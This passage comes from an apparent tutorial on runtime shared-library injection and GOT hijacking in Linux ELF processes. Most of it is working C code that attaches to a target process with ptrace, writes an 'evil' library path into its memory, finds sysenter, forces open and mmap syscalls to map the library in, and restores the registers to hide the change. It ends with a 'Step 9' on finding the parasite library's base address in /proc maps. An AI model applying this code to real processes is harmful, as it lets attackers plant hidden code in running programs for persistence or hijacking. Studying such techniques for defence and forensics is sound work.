&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> sysenter = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; strcpy<span style="color: black;">(</span>library_string, EVILLIB_FULLPATH<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* backup first part of data segment which will use for a string and some vars */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; memrw <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>orig_ds, data_segment, strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: #cc66cc;">+32</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* store our string for our evil lib there */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i += <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>library_string + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* verify we have the correct string */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span>; i+= <span style="color: #cc66cc;">4</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span>&amp;buf<span style="color: black;">[</span>i<span style="color: black;">]</span> = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>buf, EVILLIB_FULLPATH<span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Verified string is stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"String was not properly stored in DS: %s<span style="color: #000099; font-weight: bold;">\n</span>"</span>, buf<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">0</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SYSCALL, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eax = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ebx = reg.<span style="color: #202020;">ebx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ecx = reg.<span style="color: #202020;">ecx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; edx = reg.<span style="color: #202020;">edx</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; eip = reg.<span style="color: #202020;">eip</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; esp = reg.<span style="color: #202020;">esp</span>; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">long</span> syscall_eip = reg.<span style="color: #202020;">eip</span> - <span style="color: #cc66cc;">20</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this gets sysenter dynamically incase its randomized */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!static_sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, syscall_eip, <span style="color: #cc66cc;">20</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">20</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!<span style="color: black;">(</span>i % <span style="color: #cc66cc;">10</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"%.2x "</span>, tmp<span style="color: black;">[</span>i<span style="color: black;">]</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i + <span style="color: #cc66cc;">1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = syscall_eip + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this works only if sysenter isn't at random location */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>tmp, 0xffffe000, <span style="color: #cc66cc;">8192</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">8192</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>tmp<span style="color: black;">[</span>i<span style="color: black;">]</span> == 0x0f &amp;&amp; tmp<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == 0x34<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter = 0xffffe000 + i;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; sysenter -= <span style="color: #cc66cc;">5</span>;<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!sysenter<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Unable to find sysenter<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Sysenter found: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, sysenter<span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sysenter should point to: <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push &nbsp; %ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;%esp,%ebp<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sysenter <br>
&nbsp; &nbsp; &nbsp; &nbsp; */</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_ATTACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_attach"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit<span style="color: black;">(</span><span style="color: #cc66cc;">-1</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; waitpid<span style="color: black;">(</span>pid, &amp;status, WUNTRACED<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_open;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = <span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span>data_segment;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = <span style="color: #cc66cc;">0</span>; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_open<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fd = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; offset = <span style="color: black;">(</span>data_segment + strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span><span style="color: black;">)</span> + <span style="color: #cc66cc;">8</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* MAP IN TEXT RE */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, segment.<span style="color: #202020;">text_len</span> + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>segment.<span style="color: #202020;">text_len</span> &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, segment.<span style="color: #202020;">text_off</span> &amp; ~<span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>reg.<span style="color: #202020;">eax</span> != SYS_mmap<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; evil_base = reg.<span style="color: #202020;">eax</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = sysenter;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = SYS_mmap;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* MAP IN DATA RW */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// 0</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">4</span>, segment.<span style="color: #202020;">data_len</span> + <span style="color: black;">(</span>PAGE_SIZE - <span style="color: black;">(</span>segment.<span style="color: #202020;">data_len</span> &amp; <span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">8</span>, <span style="color: #cc66cc;">3</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// PROT_READ|PROT_WRITE</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">12</span>, <span style="color: #cc66cc;">2</span><span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// MAP_SHARED</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">16</span>, fd<span style="color: black;">)</span>; &nbsp; <span style="color: black; font-style: italic;">// fd</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, offset + <span style="color: #cc66cc;">20</span>, segment.<span style="color: #202020;">data_off</span> &amp; ~<span style="color: black;">(</span>PAGE_SIZE - <span style="color: #cc66cc;">1</span><span style="color: black;">)</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_GETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">5</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SINGLESTEP, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Restoring data segment<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; strlen<span style="color: black;">(</span>library_string<span style="color: black;">)</span> + <span style="color: #cc66cc;">32</span>; i++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_POKETEXT, pid, <span style="color: black;">(</span>data_segment + i<span style="color: black;">)</span>, *<span style="color: black;">(</span><span style="color: #993333;">long</span> *<span style="color: black;">)</span><span style="color: black;">(</span>orig_ds + i<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eip</span> = eip;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">eax</span> = eax;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ebx</span> = ebx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">ecx</span> = ecx;<br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">edx</span> = edx; <br>
&nbsp; &nbsp; &nbsp; &nbsp; reg.<span style="color: #202020;">esp</span> = esp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_SETREGS, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, &amp;reg<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>A final note on obtaining where sysenter exists:</p>
<p>Another way to locate sysenter would be to parse the stack of the 
process and get the AUXV AT_SYSINFO entry which contains the location of
 either sysenter or somewhere right near there, I haven't tried this, 
but I stumbled upon it as a possibility while examining that entry.</p>
<p><strong>Step 9</strong></p>
<p>In order to access our parasite code, which is a replacement 
function, we must locate the base address of our shared library now that
 it is mapped into the target process image. A processes memory maps are
 displayed in /proc/&lt;pid&gt;/maps, as will the mapping of our shared 
object, thus parsing this file is sufficient. Our shared library is 
called "libtest.so.1.0"</p>
<pre class="source">08048000-08049000 r-xp 00000000 08:03 4786267    /home/elf/got_hijack/test
08049000-0804a000 r--p 00000000 08:03 4786267    /home/elf/got_hijack/test
0804a000-0804b000 rw-p 00001000 08:03 4786267    /home/elf/got_hijack/test
b7ddf000-b7de0000 rw-p b7ddf000 00:00 0
b7de0000-b7f0a000 r-xp 00000000 08:03 378946     /lib/libc-2.6.1.so
b7f0a000-b7f0c000 r--p 0012a000 08:03 378946     /lib/libc-2.6.1.so
b7f0c000-b7f0d000 rw-p 0012c000 08:03 378946     /lib/libc-2.6.1.so

b7f0d000-b7f11000 rw-p b7f0d000 00:00 0 
       
/* if we do this the grsec way, you want the base of the text */
/* and you will see two mappings for libtest.so.1.0, the text */
/* will be maped as r-xp and the data will be rw-p */

b7f1b000-b7f1d000 rwxp 00000000 08:03 4786297    /home/elf/libtest.so.1.0
b7f1d000-b7f1e000 rw-p b7f1d000 00:00 0
b7f1e000-b7f38000 r-xp 00000000 08:03 378903     /lib/ld-2.6.1.so
b7f38000-b7f39000 r--p 00019000 08:03 378903     /lib/ld-2.6.1.so
b7f39000-b7f3a000 rw-p 0001a000 08:03 378903     /lib/ld-2.6.1.so
